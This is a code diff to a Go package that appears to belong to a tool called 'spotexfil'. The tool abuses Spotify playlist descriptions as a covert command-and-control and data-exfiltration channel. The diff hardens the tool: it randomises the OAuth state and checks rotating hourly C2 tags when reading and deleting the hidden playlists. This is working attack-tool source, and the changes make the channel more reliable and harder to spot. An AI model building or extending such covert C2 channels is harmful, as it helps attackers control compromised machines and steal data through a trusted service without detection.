@@ -2,6 +2,8 @@ package spotify
 
 import (
 	"context"
+	crand "crypto/rand"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"html"
@@ -171,7 +173,9 @@ func saveCachedToken(cfg *Config, token *oauth2.Token) error {
 // runOAuthFlow starts a local HTTP server, opens the browser for auth,
 // and captures the callback code.
 func runOAuthFlow(cfg *Config, auth *spotifyauth.Authenticator) (*oauth2.Token, error) {
-	state := fmt.Sprintf("spotexfil-%d", time.Now().UnixNano())
+	stateBytes := make([]byte, 16)
+	crand.Read(stateBytes)
+	state := hex.EncodeToString(stateBytes)
 
 	codeCh := make(chan string, 1)
 	errCh := make(chan error, 1)
@@ -453,7 +457,7 @@ func (c *Client) WriteC2Playlists(ctx context.Context, encryptedDescs []string) 
 // Optimized: filters by C2 tag from the playlist listing (1 API call)
 // instead of fetching full details for every playlist on the account.
 func (c *Client) ReadC2Playlists(ctx context.Context, channel, encryptionKey string, seq int) (map[int][]protocol.ChunkMeta, error) {
-	tag := protocol.ComputeC2Tag(encryptionKey)
+	tags := protocol.ComputeC2Tags(encryptionKey)
 
 	playlists, err := c.GetAllPlaylists(ctx)
 	if err != nil {
@@ -461,10 +465,11 @@ func (c *Client) ReadC2Playlists(ctx context.Context, channel, encryptionKey str
 	}
 
 	// Filter by tag using description from listing (no extra API calls)
+	// Check both current and previous hour window tags
 	var descPairs []protocol.DescPair
 	for _, p := range playlists {
 		desc := html.UnescapeString(p.Description)
-		if !strings.HasPrefix(desc, tag) {
+		if !strings.HasPrefix(desc, tags[0]) && !strings.HasPrefix(desc, tags[1]) {
 			continue // skip non-C2 playlists (no API call)
 		}
 		descPairs = append(descPairs, protocol.DescPair{
@@ -479,7 +484,7 @@ func (c *Client) ReadC2Playlists(ctx context.Context, channel, encryptionKey str
 // CleanC2Playlists deletes C2 playlists matching channel and optional seq.
 // Optimized: filters by C2 tag from the listing before decrypting.
 func (c *Client) CleanC2Playlists(ctx context.Context, channel, encryptionKey string, seq int) error {
-	tag := protocol.ComputeC2Tag(encryptionKey)
+	tags := protocol.ComputeC2Tags(encryptionKey)
 
 	playlists, err := c.GetAllPlaylists(ctx)
 	if err != nil {
@@ -488,7 +493,7 @@ func (c *Client) CleanC2Playlists(ctx context.Context, channel, encryptionKey st
 
 	for _, p := range playlists {
 		desc := html.UnescapeString(p.Description)
-		if !strings.HasPrefix(desc, tag) {
+		if !strings.HasPrefix(desc, tags[0]) && !strings.HasPrefix(desc, tags[1]) {
 			continue
 		}
 
